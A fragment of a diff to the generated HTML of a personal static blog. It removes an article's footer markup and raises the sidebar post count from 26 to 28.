-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2884,7 +2702,7 @@ uniq--把重复的内容只显示一次</code></pre></blockquote>
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-count">28</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
